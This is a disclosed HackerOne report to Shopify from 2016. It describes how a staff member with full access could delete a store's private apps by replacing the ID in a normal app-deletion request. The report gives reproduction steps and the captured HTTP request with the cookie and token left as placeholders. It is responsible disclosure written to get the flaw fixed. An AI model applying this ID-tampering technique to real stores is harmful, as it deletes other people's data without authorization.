# Staff member can delete Private Apps

## Report Details
- **Report ID**: 155704
- **URL**: https://hackerone.com/reports/155704
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-01T01:21:34.225Z
- **Disclosed**: 2016-08-09T00:26:01.123Z

## Reporter
- **Username**: indoappsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi Team,

Bug description : I noticed that Full access staff member doesn't have access to private Apps Even he has access to Apps. But a Staff member can actually Delete Private Apps through the normal App link by changing the ID. 

Steps to reproduce : 
1. Create A shop and install any app. Also create private App. 
2. Add a staff member with full access .
3. Now Login from staff member and go to app section from his account.You will see that he is not able to access private Apps yet.
4. Now Try to delete the normal App and Capture the request.The request will look like the following request : 

Vulnerable HTTP request : 

POST /admin/apps/[App_ID]HTTP/1.1
Host: [your_store].myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://vijaygangani1110store.myshopify.com/admin/apps
Cookie: [Cookie]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 132

_method=delete&authenticity_token=[Token]

5. Change the App ID to private App ID and you will see from Owners account that the private App has been Deleted. 

App_ID parameter is vulnerable here. Server doesn't check the permissions and let the staff member Delete the App.


Let me know if you need any other help from my side. 

Best Regards !
Vijay Kumar 




## Attachments
No attachments
